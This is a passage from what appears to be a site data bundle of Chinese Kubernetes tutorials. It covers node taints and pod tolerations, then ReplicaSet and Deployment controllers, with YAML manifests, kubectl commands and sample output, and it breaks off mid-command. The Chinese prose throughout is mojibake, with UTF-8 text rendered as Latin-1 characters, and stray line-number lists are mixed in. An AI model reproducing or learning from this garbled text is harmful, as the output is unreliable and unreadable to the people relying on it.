ä¹é´å­å¨äºä¸ç§ç¸æ¥çå³ç³»ï¼è¿èæç» pod è°åº¦è¿æ¥ï¼çè³å¯ä»¥å°å·²ç»å­å¨ç pod é©±éåºå»ã\n\næ±¡ç¹çæ ¼å¼ä¸ºï¼ key=value:effect , key å value æ¯æ±¡ç¹çæ ç­¾ï¼effect æè¿°æ±¡ç¹çä½ç¨ï¼æ¯æå¦ä¸ä¸ä¸ªéé¡¹ï¼\n\n * prefernoscheduleï¼kubernetes å°å°½éé¿åæ pod è°åº¦å°å·æè¯¥æ±¡ç¹ç node ä¸ï¼é¤éæ²¡æå¶ä»èç¹å¯è°åº¦\n * noscheduleï¼kubernetes å°ä¸ä¼æ pod è°åº¦å°å·æè¯¥æ±¡ç¹ç node ä¸ï¼ä½ä¸ä¼å½±åå½å node ä¸å·²å­å¨ç pod\n * noexecuteï¼kubernetes å°ä¸ä¼æ pod è°åº¦å°å·æè¯¥æ±¡ç¹ç node ä¸ï¼åæ¶ä¹ä¼å° node ä¸å·²å­å¨ç pod é©±ç¦»\n\n\n\nä½¿ç¨ kubectl è®¾ç½®åå»é¤æ±¡ç¹çå½ä»¤ç¤ºä¾å¦ä¸ï¼\n\n# è®¾ç½®æ±¡ç¹\nkubectl taint nodes èç¹åç§° key=value:effect\n\n# å»é¤æ±¡ç¹\nkubectl taint nodes èç¹åç§° key:effect-\n\n# å»é¤æææ±¡ç¹\nkubectl taint nodes èç¹åç§° key-\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næ¥ä¸æ¥ï¼æ¼ç¤ºä¸æ±¡ç¹çææï¼\n\n 1. åå¤èç¹ node1ï¼ä¸ºäºæ¼ç¤ºæææ´å ææ¾ï¼ææ¶åæ­¢ node2 èç¹ï¼\n 2. ä¸º node1 èç¹è®¾ç½®ä¸ä¸ªæ±¡ç¹: tag=heima:prefernoschedule ï¼ç¶ååå»º pod1 (pod1 å¯ä»¥)\n 3. ä¿®æ¹ä¸º node1 èç¹è®¾ç½®ä¸ä¸ªæ±¡ç¹: tag=heima:noschedule ï¼ç¶ååå»º pod2 (pod1 æ­£å¸¸ pod2 å¤±è´¥)\n 4. ä¿®æ¹ä¸º node1 èç¹è®¾ç½®ä¸ä¸ªæ±¡ç¹: tag=heima:noexecute ï¼ç¶ååå»º pod3 (3 ä¸ª pod é½å¤±è´¥)\n\n# ä¸ºnode1è®¾ç½®æ±¡ç¹(prefernoschedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:prefernoschedule\n\n# åå»ºpod1\n[root@k8s-master01 ~]# kubectl run taint1 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname                      ready   status    restarts   age     ip           node   \ntaint1-7665f7fd85-574h4   1/1     running   0          2m24s   10.244.1.59   node1    \n\n# ä¸ºnode1è®¾ç½®æ±¡ç¹(åæ¶prefernoscheduleï¼è®¾ç½®noschedule)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:prefernoschedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:noschedule\n\n# åå»ºpod2\n[root@k8s-master01 ~]# kubectl run taint2 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods taint2 -n dev -o wide\nname                      ready   status    restarts   age     ip            node\ntaint1-7665f7fd85-574h4   1/1     running   0          2m24s   10.244.1.59   node1 \ntaint2-544694789-6zmlf    0/1     pending   0          21s     <none>        <none>   \n\n# ä¸ºnode1è®¾ç½®æ±¡ç¹(åæ¶noscheduleï¼è®¾ç½®noexecute)\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag:noschedule-\n[root@k8s-master01 ~]# kubectl taint nodes node1 tag=heima:noexecute\n\n# åå»ºpod3\n[root@k8s-master01 ~]# kubectl run taint3 --image=nginx:1.17.1 -n dev\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname                      ready   status    restarts   age   ip       node     nominated \ntaint1-7665f7fd85-htkmp   0/1     pending   0          35s   <none>   <none>   <none>    \ntaint2-544694789-bn7wb    0/1     pending   0          35s   <none>   <none>   <none>     \ntaint3-6d78dbd749-tktkq   0/1     pending   0          6s    <none>   <none>   <none>     \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n> ä½¿ç¨ kubeadm æ­å»ºçéç¾¤ï¼é»è®¤å°±ä¼ç» master èç¹æ·»å ä¸ä¸ªæ±¡ç¹æ è®°ï¼æä»¥ pod å°±ä¸ä¼è°åº¦å° master èç¹ä¸.\n\nå®¹å¿ï¼tolerationï¼\n\nä¸é¢ä»ç»äºæ±¡ç¹çä½ç¨ï¼æä»¬å¯ä»¥å¨ node ä¸æ·»å æ±¡ç¹ç¨äºæç» pod è°åº¦ä¸æ¥ï¼ä½æ¯å¦æå°±æ¯æ³å°ä¸ä¸ª pod è°åº¦å°ä¸ä¸ªææ±¡ç¹ç node ä¸å»ï¼è¿æ¶ååºè¯¥æä¹åå¢ï¼è¿å°±è¦ä½¿ç¨å°å®¹å¿ã\n\n\n\n> æ±¡ç¹å°±æ¯æç»ï¼å®¹å¿å°±æ¯å¿½ç¥ï¼node éè¿æ±¡ç¹æç» pod è°åº¦ä¸å»ï¼pod éè¿å®¹å¿å¿½ç¥æç»\n\nä¸é¢åéè¿ä¸ä¸ªæ¡ä¾çä¸ææï¼\n\n 1. ä¸ä¸å°èï¼å·²ç»å¨ node1 èç¹ä¸æä¸äº noexecute çæ±¡ç¹ï¼æ­¤æ¶ pod æ¯è°åº¦ä¸ä¸å»ç\n 2. æ¬å°èï¼å¯ä»¥éè¿ç» pod æ·»å å®¹å¿ï¼ç¶åå°å¶è°åº¦ä¸å»\n\nåå»º pod-toleration.yaml, åå®¹å¦ä¸\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-toleration\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  tolerations:      # æ·»å å®¹å¿\n  - key: "tag"        # è¦å®¹å¿çæ±¡ç¹çkey\n    operator: "equal" # æä½ç¬¦\n    value: "heima"    # å®¹å¿çæ±¡ç¹çvalue\n    effect: "noexecute"   # æ·»å å®¹å¿çè§åï¼è¿éå¿é¡»åæ è®°çæ±¡ç¹è§åç¸å\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# æ·»å å®¹å¿ä¹åçpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname             ready   status    restarts   age   ip       node     nominated \npod-toleration   0/1     pending   0          3s    <none>   <none>   <none>           \n\n# æ·»å å®¹å¿ä¹åçpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname             ready   status    restarts   age   ip            node    nominated\npod-toleration   1/1     running   0          3s    10.244.1.62   node1   <none>        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nä¸é¢çä¸ä¸å®¹å¿çè¯¦ç»éç½®:\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.tolerations\n......\nfields:\n   key       \n   value     \n   operator  \n   effect    \n   tolerationseconds  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * key å¯¹åºçè¦å®¹å¿çæ±¡ç¹çé®ï¼ç©ºæå³çå¹éææçé®\n * value å¯¹åºçè¦å®¹å¿çæ±¡ç¹çå¼\n * operator key-value çè¿ç®ç¬¦ï¼æ¯æ equal å existsï¼é»è®¤ï¼\n * effect å¯¹åºæ±¡ç¹ç effectï¼ç©ºæå³çå¹éææå½±å\n * tolerationseconds å®¹å¿æ¶é´ï¼å½ effect ä¸º noexecute æ¶çæï¼è¡¨ç¤º pod å¨ node ä¸çåçæ¶é´',charsets:{cjk:!0}},{title:"kubernetes(å«) Pod æ§å¶å¨è¯¦è§£",frontmatter:{title:"kubernetes(å«) Pod æ§å¶å¨è¯¦è§£",date:"2023-06-25T09:22:36.000Z",permalink:"/kubernetes/607",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/60.Kubernetes/607.kubernetes(%E5%85%AB)%20Pod%20%E6%8E%A7%E5%88%B6%E5%99%A8%E8%AF%A6%E8%A7%A3.html",relativePath:"04.è¿ç»´/60.Kubernetes/607.kubernetes(å«) Pod æ§å¶å¨è¯¦è§£.md",key:"v-4af5aed9",path:"/kubernetes/607/",headers:[{level:2,title:"Podæ§å¶å¨ä»ç»",slug:"podæ§å¶å¨ä»ç»",normalizedTitle:"pod æ§å¶å¨ä»ç»",charIndex:2},{level:2,title:"ReplicaSet(RS)",slug:"replicaset-rs",normalizedTitle:"replicaset(rs)",charIndex:788},{level:2,title:"Deployment(Deploy)",slug:"deployment-deploy",normalizedTitle:"deployment(deploy)",charIndex:6384},{level:2,title:"Horizontal Pod Autoscaler(HPA)",slug:"horizontal-pod-autoscaler-hpa",normalizedTitle:"horizontal pod autoscaler(hpa)",charIndex:19499},{level:2,title:"DaemonSet(DS)",slug:"daemonset-ds",normalizedTitle:"daemonset(ds)",charIndex:27271},{level:2,title:"Job",slug:"job",normalizedTitle:"job",charIndex:675},{level:2,title:"CronJob(CJ)",slug:"cronjob-cj",normalizedTitle:"cronjob(cj)",charIndex:33743}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Podæ§å¶å¨ä»ç» ReplicaSet(RS) Deployment(Deploy) Horizontal Pod Autoscaler(HPA) DaemonSet(DS) Job CronJob(CJ)",content:'# Pod æ§å¶å¨ä»ç»\n\nPod æ¯ kubernetes çæå°ç®¡çååï¼å¨ kubernetes ä¸­ï¼æç§ pod çåå»ºæ¹å¼å¯ä»¥å°å¶åä¸ºä¸¤ç±»ï¼\n\n * èªä¸»å¼ podï¼kubernetes ç´æ¥åå»ºåºæ¥ç Podï¼è¿ç§ pod å é¤åå°±æ²¡æäºï¼ä¹ä¸ä¼éå»º\n * æ§å¶å¨åå»ºç podï¼kubernetes éè¿æ§å¶å¨åå»ºç podï¼è¿ç§ pod å é¤äºä¹åè¿ä¼èªå¨éå»º\n\n> ä»ä¹æ¯Podæ§å¶å¨\n> Pod æ§å¶å¨æ¯ç®¡ç pod çä¸­é´å±ï¼ä½¿ç¨ Pod æ§å¶å¨ä¹åï¼åªéè¦åè¯ Pod æ§å¶å¨ï¼æ³è¦å¤å°ä¸ªä»ä¹æ ·ç Pod å°±å¯ä»¥äºï¼å®ä¼åå»ºåºæ»¡è¶³æ¡ä»¶ç Pod å¹¶ç¡®ä¿æ¯ä¸ä¸ª Pod èµæºå¤äºç¨æ·ææçç®æ ç¶æãå¦æ Pod èµæºå¨è¿è¡ä¸­åºç°æéï¼å®ä¼åºäºæå®ç­ç¥éæ°ç¼æ Podã\n\nå¨ kubernetes ä¸­ï¼æå¾å¤ç±»åç pod æ§å¶å¨ï¼æ¯ç§é½æèªå·±çéåçåºæ¯ï¼å¸¸è§çæä¸é¢è¿äºï¼\n\n * ReplicationControllerï¼æ¯è¾åå§ç pod æ§å¶å¨ï¼å·²ç»è¢«åºå¼ï¼ç± ReplicaSet æ¿ä»£\n * ReplicaSetï¼ä¿è¯å¯æ¬æ°éä¸ç´ç»´æå¨ææå¼ï¼å¹¶æ¯æ pod æ°éæ©ç¼©å®¹ï¼éåçæ¬åçº§\n * Deploymentï¼éè¿æ§å¶ ReplicaSet æ¥æ§å¶ Podï¼å¹¶æ¯ææ»å¨åçº§ãåéçæ¬\n * Horizontal Pod Autoscalerï¼å¯ä»¥æ ¹æ®éç¾¤è´è½½èªå¨æ°´å¹³è°æ´ Pod çæ°éï¼å®ç°åå³°å¡«è°·\n * DaemonSetï¼å¨éç¾¤ä¸­çæå® Node ä¸è¿è¡ä¸ä»è¿è¡ä¸ä¸ªå¯æ¬ï¼ä¸è¬ç¨äºå®æ¤è¿ç¨ç±»çä»»å¡\n * Jobï¼å®åå»ºåºæ¥ç pod åªè¦å®æä»»å¡å°±ç«å³éåºï¼ä¸éè¦éå¯æéå»ºï¼ç¨äºæ§è¡ä¸æ¬¡æ§ä»»å¡\n * Cronjobï¼å®åå»ºç Pod è´è´£å¨ææ§ä»»å¡æ§å¶ï¼ä¸éè¦æç»­åå°è¿è¡\n * StatefulSetï¼ç®¡çæç¶æåºç¨\n\n\n# ReplicaSet(RS)\n\nReplicaSet çä¸»è¦ä½ç¨æ¯ä¿è¯ä¸å®æ°éç pod æ­£å¸¸è¿è¡ï¼å®ä¼æç»­çå¬è¿äº Pod çè¿è¡ç¶æï¼ä¸æ¦ Pod åçæéï¼å°±ä¼éå¯æéå»ºãåæ¶å®è¿æ¯æå¯¹ pod æ°éçæ©ç¼©å®¹åéåçæ¬çåéçº§ã\n\n\n\nReplicaSet çèµæºæ¸åæä»¶ï¼\n\napiVersion: apps/v1 # çæ¬å·\nkind: ReplicaSet # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: rs\nspec: # è¯¦ææè¿°\n  replicas: 3 # å¯æ¬æ°é\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchLabels:      # Labelså¹éè§å\n      app: nginx-pod\n    matchExpressions: # Expressionså¹éè§å\n      - {key: app, operator: In, values: [nginx-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\nå¨è¿éé¢ï¼éè¦æ°äºè§£çéç½®é¡¹å°±æ¯ spec ä¸é¢å ä¸ªéé¡¹ï¼\n\n * replicasï¼æå®å¯æ¬æ°éï¼å¶å®å°±æ¯å½å rs åå»ºåºæ¥ç pod çæ°éï¼é»è®¤ä¸º 1\n * selectorï¼éæ©å¨ï¼å®çä½ç¨æ¯å»ºç« pod æ§å¶å¨å pod ä¹é´çå³èå³ç³»ï¼éç¨ç Label Selector æºå¶\n   å¨ pod æ¨¡æ¿ä¸å®ä¹ labelï¼å¨æ§å¶å¨ä¸å®ä¹éæ©å¨ï¼å°±å¯ä»¥è¡¨æå½åæ§å¶å¨è½ç®¡çåªäº pod äº\n * templateï¼æ¨¡æ¿ï¼å°±æ¯å½åæ§å¶å¨åå»º pod æä½¿ç¨çæ¨¡æ¿æ¿ï¼éé¢å¶å®å°±æ¯åä¸ç« å­¦è¿ç pod çå®ä¹\n\nåå»º ReplicaSet\nåå»º pc-replicaset.yaml æä»¶ï¼åå®¹å¦ä¸ï¼\n\napiVersion: apps/v1\nkind: ReplicaSet   \nmetadata:\n  name: pc-replicaset\n  namespace: dev\nspec:\n  replicas: 3\n  selector: \n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå»ºrs\n[root@k8s-master01 ~]# kubectl create -f pc-replicaset.yaml\nreplicaset.apps/pc-replicaset created\n\n# æ¥çrs\n# DESIRED:ææå¯æ¬æ°é  \n# CURRENT:å½åå¯æ¬æ°é  \n# READY:å·²ç»åå¤å¥½æä¾æå¡çå¯æ¬æ°é\n[root@k8s-master01 ~]# kubectl get rs pc-replicaset -n dev -o wide\nNAME          DESIRED   CURRENT READY AGE   CONTAINERS   IMAGES             SELECTOR\npc-replicaset 3         3       3     22s   nginx        nginx:1.17.1       app=nginx-pod\n\n# æ¥çå½åæ§å¶å¨åå»ºåºæ¥çpod\n# è¿éåç°æ§å¶å¨åå»ºåºæ¥çpodçåç§°æ¯å¨æ§å¶å¨åç§°åé¢æ¼æ¥äº-xxxxxéæºç \n[root@k8s-master01 ~]# kubectl get pod -n dev\nNAME                          READY   STATUS    RESTARTS   AGE\npc-replicaset-6vmvt   1/1     Running   0          54s\npc-replicaset-fmb8f   1/1     Running   0          54s\npc-replicaset-snrk2   1/1     Running   0          54s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\næ©ç¼©å®¹\n\n# ç¼è¾rsçå¯æ¬æ°éï¼ä¿®æ¹spec:replicas: 6å³å¯\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                          READY   STATUS    RESTARTS   AGE\npc-replicaset-6vmvt   1/1     Running   0          114m\npc-replicaset-cftnp   1/1     Running   0          10s\npc-replicaset-fjlm6   1/1     Running   0          10s\npc-replicaset-fmb8f   1/1     Running   0          114m\npc-replicaset-s2whj   1/1     Running   0          10s\npc-replicaset-snrk2   1/1     Running   0          114m\n\n# å½ç¶ä¹å¯ä»¥ç´æ¥ä½¿ç¨å½ä»¤å®ç°\n# ä½¿ç¨scaleå½ä»¤å®ç°æ©ç¼©å®¹ï¼ åé¢--replicas=nç´æ¥æå®ç®æ æ°éå³å¯\n[root@k8s-master01 ~]# kubectl scale rs pc-replicaset --replicas=2 -n dev\nreplicaset.apps/pc-replicaset scaled\n\n# å½ä»¤è¿è¡å®æ¯ï¼ç«å³æ¥çï¼åç°å·²ç»æ4ä¸ªå¼å§åå¤éåºäº\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                       READY   STATUS        RESTARTS   AGE\npc-replicaset-6vmvt   0/1     Terminating   0          118m\npc-replicaset-cftnp   0/1     Terminating   0          4m17s\npc-replicaset-fjlm6   0/1     Terminating   0          4m17s\npc-replicaset-fmb8f   1/1     Running       0          118m\npc-replicaset-s2whj   0/1     Terminating   0          4m17s\npc-replicaset-snrk2   1/1     Running       0          118m\n\n#ç¨ç­çå»ï¼å°±åªå©ä¸2ä¸ªäº\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                       READY   STATUS    RESTARTS   AGE\npc-replicaset-fmb8f   1/1     Running   0          119m\npc-replicaset-snrk2   1/1     Running   0          119m\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\néååçº§\n\n# ç¼è¾rsçå®¹å¨éå - image: nginx:1.17.2\n[root@k8s-master01 ~]# kubectl edit rs pc-replicaset -n dev\nreplicaset.apps/pc-replicaset edited\n\n# åæ¬¡æ¥çï¼åç°éåçæ¬å·²ç»åæ´äº\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                DESIRED  CURRENT   READY   AGE    CONTAINERS   IMAGES        ...\npc-replicaset       2        2         2       140m   nginx         nginx:1.17.2  ...\n\n# åæ ·çéçï¼ä¹å¯ä»¥ä½¿ç¨å½ä»¤å®æè¿ä¸ªå·¥ä½\n# kubectl set image rs rsåç§° å®¹å¨=éåçæ¬ -n namespace\n[root@k8s-master01 ~]# kubectl set image rs pc-replicaset nginx=nginx:1.17.1  -n dev\nreplicaset.apps/pc-replicaset image updated\n\n# åæ¬¡æ¥çï¼åç°éåçæ¬å·²ç»åæ´äº\n[root@k8s-master01 ~]# kubectl get rs -n dev -o wide\nNAME                 DESIRED  CURRENT   READY   AGE    CONTAINERS   IMAGES            ...\npc-replicaset        2        2         2       145m   nginx        nginx:1.17.1 ... \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nå é¤ ReplicaSet\n\n# ä½¿ç¨kubectl deleteå½ä»¤ä¼å é¤æ­¤RSä»¥åå®ç®¡ççPod\n# å¨kuberneteså é¤RSåï¼ä¼å°RSçreplicasclearè°æ´ä¸º0ï¼ç­å¾ææçPodè¢«å é¤åï¼å¨æ§è¡RSå¯¹è±¡çå é¤\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pod -n dev -o wide\nNo resources found in dev namespace.\n\n# å¦æå¸æä»ä»å é¤RSå¯¹è±¡ï¼ä¿çPodï¼ï¼å¯ä»¥ä½¿ç¨kubectl deleteå½ä»¤æ¶æ·»å --cascade=falseéé¡¹ï¼ä¸æ¨èï¼ã\n[root@k8s-master01 ~]# kubectl delete rs pc-replicaset -n dev --cascade=false\nreplicaset.apps "pc-replicaset" deleted\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                  READY   STATUS    RESTARTS   AGE\npc-replicaset-cl82j   1/1     Running   0          75s\npc-replicaset-dslhb   1/1     Running   0          75s\n\n# ä¹å¯ä»¥ä½¿ç¨yamlç´æ¥å é¤(æ¨è)\n[root@k8s-master01 ~]# kubectl delete -f pc-replicaset.yaml\nreplicaset.apps "pc-replicaset" deleted\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# Deployment(Deploy)\n\nä¸ºäºæ´å¥½çè§£å³æå¡ç¼æçé®é¢ï¼kubernetes å¨ V1.2 çæ¬å¼å§ï¼å¼å¥äº Deployment æ§å¶å¨ãå¼å¾ä¸æçæ¯ï¼è¿ç§æ§å¶å¨å¹¶ä¸ç´æ¥ç®¡ç podï¼èæ¯éè¿ç®¡ç ReplicaSet æ¥ç®ä»ç®¡ç Podï¼å³ï¼Deployment ç®¡ç ReplicaSetï¼ReplicaSet ç®¡ç Podãæä»¥ Deployment æ¯ ReplicaSet åè½æ´å å¼ºå¤§ã\n\n\n\nDeployment ä¸»è¦åè½æä¸é¢å ä¸ªï¼\n\n * æ¯æ ReplicaSet çææåè½\n * æ¯æåå¸çåæ­¢ãç»§ç»­\n * æ¯ææ»å¨æ´æ°ååæ»çæ¬\n\nDeployment çèµæºæ¸åæä»¶ï¼\n\napiVersion: apps/v1 # çæ¬å·\nkind: Deployment # ç±»å       \nmetadata: # åæ°æ®\n  name: # rsåç§° \n  namespace: # æå±å½åç©ºé´ \n  labels: #æ ç­¾\n    controller: deploy\nspec: # è¯¦ææè¿°\n  replicas: 3 # å¯æ¬æ°é\n  revisionHistoryLimit: 3 # ä¿çåå²çæ¬\n  paused: false # æåé¨ç½²ï¼é»è®¤æ¯false\n  progressDeadlineSeconds: 600 # é¨ç½²è¶æ¶æ¶é´ï¼sï¼ï¼é»è®¤æ¯600\n  strategy: # ç­ç¥\n    type: RollingUpdate # æ»å¨æ´æ°ç­ç¥\n    rollingUpdate: # æ»å¨æ´æ°\n      maxSurge: 30% # æå¤§é¢å¤å¯ä»¥å­å¨çå¯æ¬æ°ï¼å¯ä»¥ä¸ºç¾åæ¯ï¼ä¹å¯ä»¥ä¸ºæ´æ°\n      maxUnavailable: 30% # æå¤§ä¸å¯ç¨ç¶æç Pod çæå¤§å¼ï¼å¯ä»¥ä¸ºç¾åæ¯ï¼ä¹å¯ä»¥ä¸ºæ´æ°\n  selector: # éæ©å¨ï¼éè¿å®æå®è¯¥æ§å¶å¨ç®¡çåªäºpod\n    matchLabels:      # Labelså¹éè§å\n      app: nginx-pod\n    matchExpressions: # Expressionså¹éè§å\n      - {key: app, operator: In, values: [nginx-pod]}\n  template: # æ¨¡æ¿ï¼å½å¯æ¬æ°éä¸è¶³æ¶ï¼ä¼æ ¹æ®ä¸é¢çæ¨¡æ¿åå»ºpodå¯æ¬\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n        ports:\n        - containerPort: 80\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\nåå»º deployment\nåå»º pc-deployment.yamlï¼åå®¹å¦ä¸ï¼\n\napiVersion: apps/v1\nkind: Deployment      \nmetadata:\n  name: pc-deployment\n  namespace: dev\nspec: \n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx-pod\n  template:\n    metadata:\n      labels:\n        app: nginx-pod\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå»ºdeployment\n[root@k8s-master01 ~]# kubectl create -f pc-deployment.yaml --record=true\ndeployment.apps/pc-deployment created\n\n# æ¥çdeployment\n# UP-TO-DATE ææ°çæ¬çpodçæ°é\n# AVAILABLE  å½åå¯ç¨çpodçæ°é\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nNAME            READY   UP-TO-DATE   AVAILABLE   AGE\npc-deployment   3/3     3            3           15s\n\n# æ¥çrs\n# åç°rsçåç§°æ¯å¨åæ¥deploymentçåå­åé¢æ·»å äºä¸ä¸ª10ä½æ°çéæºä¸²\n[root@k8s-master01 ~]# kubectl get rs -n dev\nNAME                       DESIRED   CURRENT   READY   AGE\npc-deployment-6696798b78   3         3         3       23s\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6696798b78-d2c8n   1/1     Running   0          107s\npc-deployment-6696798b78-smpvp   1/1     Running   0          107s\npc-deployment-6696798b78-wvjd8   1/1     Running   0          107s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\næ©ç¼©å®¹\n\n# åæ´å¯æ¬æ°éä¸º5ä¸ª\n[root@k8s-master01 ~]# kubectl scale deploy pc-deployment --replicas=5  -n dev\ndeployment.apps/pc-deployment scaled\n\n# æ¥çdeployment\n[root@k8s-master01 ~]# kubectl get deploy pc-deployment -n dev\nNAME            READY   UP-TO-DATE   AVAILABLE   AGE\npc-deployment   5/5     5            5           2m\n\n# æ¥çpod\n[root@k8s-master01 ~]#  kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6696798b78-d2c8n   1/1     Running   0          4m19s\npc-deployment-6696798b78-jxmdq   1/1     Running   0          94s\npc-deployment-6696798b78-mktqv   1/1     Running   0          93s\npc-deployment-6696798b78-smpvp   1/1     Running   0          4m19s\npc-deployment-6696798b78-wvjd8   1/1     Running   0          4m19s\n\n# ç¼è¾deploymentçå¯æ¬æ°éï¼ä¿®æ¹spec:replicas: 4å³å¯\n[root@k8s-master01 ~]# kubectl edit deploy pc-deployment -n dev\ndeployment.apps/pc-deployment edited\n\n# æ¥çpod\n[root@k8s-master01 ~]# kubectl get pods -n dev\nNAME                             READY   STATUS    RESTARTS   AGE\npc-deployment-6696798b78-d2c8n   1/1     Running   0          5m23s\npc-deployment-6696798b78-jxmdq   1/1     Running   0          2m38s\npc-deployment-6696798b78-smpvp   1/1     Running   0          5m23s\npc-deployment-6696798b78-wvjd8   1/1     Running   0          5m23s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\néåæ´æ°\ndeployment æ¯æä¸¤ç§æ´æ°ç­ç¥: éå»ºæ´æ°ï¼å æææèçæ¬å¾podï¼ç¶åéå»ºæ°çæ¬çpodï¼ å æ»å¨æ´æ°ï¼é»è®¤ï¼ï¼ä¸ä¼ä¸æ¬¡æ§å é¤ï¼åå ä¸é¨åä½çæ¬ï¼å»ºç«ä¸é¨åæ°çæ¬ï¼ä»¥æ­¤ç±»æ¨ï¼ç´å°æ»¡è¶³æ°éï¼ , å¯ä»¥éè¿ strategy æå®ç­ç¥ç±»åï¼æ¯æä¸¤ä¸ªå±æ§:\n\nstrategyï¼æå®æ°çPodæ¿æ¢æ§çPodçç­ç¥ï¼ æ¯æä¸¤ä¸ªå±æ§ï¼\n  typeï¼æå®ç­ç¥ç±»åï¼æ¯æä¸¤ç§ç­ç¥\n    Recreateï¼å¨åå»ºåºæ°çPodä¹åä¼åææææå·²å­å¨çPod\n    RollingUpdateï¼æ»å¨æ´æ°ï¼å°±æ¯ææ­»ä¸é¨åï¼å°±å¯å¨ä¸é¨åï¼å¨æ´æ°è¿ç¨ä¸­ï¼å­å¨ä¸¤ä¸ªçæ¬Pod\n  rollingUpdateï¼å½typeä¸ºRollingUpdateæ¶çæï¼ç¨äºä¸ºRollingUpdateè®¾ç½®åæ°ï¼æ¯æä¸¤ä¸ªå±æ§ï¼\n    maxUnavailableï¼ç¨æ¥æå®å¨åçº§è¿ç¨ä¸­ä¸å¯ç¨Podçæå¤§æ°éï¼é»è®¤ä¸º25%ã\n    maxSurgeï¼ ç¨æ¥æå®å¨åçº§è¿ç¨ä¸­å¯ä»¥è¶è¿ææçPodçæå¤§æ°éï¼é»è®¤ä¸º25%ã\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\néå»ºæ´æ°\n1. ç¼è¾ pc-deployment.yaml, å¨ spec èç¹ä¸æ·»å æ´æ°ç­ç¥\n\nspec:\n  strategy: # ç­ç¥\n    type: Recreate # éå»ºæ´æ°\n\n\n1\n2\n3\n\n\n2. åå»º deploy è¿è¡éªè¯\n\n# åæ´éå\n[root@k8s-master01 ~]# kubectl set image deployment pc-deployment nginx=nginx:1.17.2 -n dev\ndeployment.apps/pc-deployment image 